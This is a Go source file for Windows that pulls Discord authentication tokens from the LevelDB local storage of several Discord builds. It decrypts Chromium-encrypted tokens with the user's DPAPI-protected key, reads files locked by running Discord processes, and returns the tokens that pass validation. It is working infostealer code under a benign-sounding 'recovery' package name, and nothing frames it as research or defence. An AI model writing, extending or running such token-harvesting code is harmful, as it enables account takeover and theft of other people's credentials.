//go:build windows

package discord

import (
	"encoding/base64"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"sync"

	"recovery/recovery/crypto"
	"recovery/recovery/platform"
)

var discordApps = []DiscordApp{
	{"Discord", "discord"},
	{"Discord PTB", "discordptb"},
	{"Discord Canary", "discordcanary"},
	{"Discord Dev", "discorddevelopment"},
}

func discordV10Key(appDir string) []byte {
	data, err := os.ReadFile(filepath.Join(appDir, "Local State"))
	if err != nil {
		return nil
	}
	var state map[string]interface{}
	if err := json.Unmarshal(data, &state); err != nil {
		return nil
	}
	osCrypt, _ := state["os_crypt"].(map[string]interface{})
	if osCrypt == nil {
		return nil
	}
	encKeyB64, _ := osCrypt["encrypted_key"].(string)
	if encKeyB64 == "" {
		return nil
	}
	encKey, err := base64.StdEncoding.DecodeString(encKeyB64)
	if err != nil || len(encKey) <= 5 {
		return nil
	}
	key, err := crypto.CryptUnprotectData(encKey[5:])
	if err != nil {
		return nil
	}
	return key
}

var discordExeNames = map[string]string{
	"discord":            "Discord.exe",
	"discordptb":         "DiscordPTB.exe",
	"discordcanary":      "DiscordCanary.exe",
	"discorddevelopment": "DiscordDevelopment.exe",
}

func readDiscordFile(path string, pids []uint32) ([]byte, error) {
	return platform.ReadLockedFile(path, pids)
}

func ExtractTokens() []TokenResult {
	appdata := os.Getenv("APPDATA")
	if appdata == "" {
		return nil
	}

	type candidate struct {
		token  string
		source string
	}

	seen := make(map[string]struct{})
	var candidates []candidate

	for _, app := range discordApps {
		appDir := filepath.Join(appdata, app.Dir)
		leveldb := filepath.Join(appDir, "Local Storage", "leveldb")

		entries, err := os.ReadDir(leveldb)
		if err != nil {
			continue
		}

		exeName := discordExeNames[app.Dir]
		pids, _ := platform.FindProcesses(exeName)

		var v10Key []byte
		keyOnce := sync.Once{}
		getKey := func() []byte {
			keyOnce.Do(func() { v10Key = discordV10Key(appDir) })
			return v10Key
		}

		for _, e := range entries {
			if e.IsDir() {
				continue
			}
			ext := strings.ToLower(filepath.Ext(e.Name()))
			if ext != ".log" && ext != ".ldb" {
				continue
			}
			data, err := readDiscordFile(filepath.Join(leveldb, e.Name()), pids)
			if err != nil {
				continue
			}

			for _, m := range TokenRe.FindAll(data, -1) {
				tok := string(m)
				if _, dup := seen[tok]; !dup {
					seen[tok] = struct{}{}
					candidates = append(candidates, candidate{tok, app.Name})
				}
			}

			for _, m := range EncRe.FindAll(data, -1) {
				raw := string(m)
				colonIdx := strings.Index(raw, ":")
				if colonIdx < 0 {
					continue
				}
				blob, err := base64.StdEncoding.DecodeString(raw[colonIdx+1:])
				if err != nil {
					continue
				}
				key := getKey()
				if key == nil {
					continue
				}
				tok := crypto.DecryptChromiumBlob(blob, key, nil)
				if tok == "" || !TokenRe.MatchString(tok) {
					continue
				}
				if _, dup := seen[tok]; !dup {
					seen[tok] = struct{}{}
					candidates = append(candidates, candidate{tok, app.Name})
				}
			}
		}
	}

	if len(candidates) == 0 {
		return nil
	}

	valid := make([]bool, len(candidates))
	var wg sync.WaitGroup
	sem := make(chan struct{}, 6)
	for i, c := range candidates {
		wg.Add(1)
		go func(idx int, tok string) {
			defer wg.Done()
			sem <- struct{}{}
			valid[idx] = CheckToken(tok)
			<-sem
		}(i, c.token)
	}
	wg.Wait()

	var out []TokenResult
	for i, c := range candidates {
		if valid[i] {
			out = append(out, TokenResult{Token: c.token, Source: c.source})
		}
	}
	return out
}
